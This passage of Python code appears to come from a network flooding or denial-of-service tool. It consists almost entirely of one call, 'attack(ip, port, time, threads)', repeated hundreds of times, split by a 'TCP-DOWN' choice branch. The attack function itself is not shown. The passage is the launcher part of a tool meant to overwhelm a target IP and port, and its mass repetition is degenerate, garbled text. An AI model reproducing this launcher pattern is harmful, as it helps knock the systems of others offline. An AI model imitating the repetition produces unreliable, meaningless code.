        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
     if choice == 'TCP-DOWN':
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
